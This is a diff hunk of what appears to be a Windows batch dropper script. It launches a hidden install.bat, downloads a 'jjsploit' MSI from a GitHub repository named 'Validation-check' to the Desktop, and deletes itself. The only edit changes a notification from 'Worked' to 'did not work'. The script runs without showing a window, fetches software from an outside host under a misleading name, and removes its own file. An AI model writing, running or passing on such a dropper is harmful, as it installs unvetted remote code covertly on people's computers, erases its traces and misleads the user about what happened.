@@ -12,6 +12,6 @@ powershell -Command "Start-Process '"%APPDATA%\install.bat' -WindowStyle Hidden 
 powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Glareing/Validation-check/main/jjsploit_8.14.1_x64_en-US.msi' -OutFile '%USERPROFILE%/Desktop'"
 if not exist "%APPDATA%\install.bat" (
     timeout /t 2
-    powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; [System.Windows.Forms.MessageBox]::Show('Worked','Notification')"
+    powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; [System.Windows.Forms.MessageBox]::Show('did not work','Notification')"
 )
 (del "%~f0") & exit
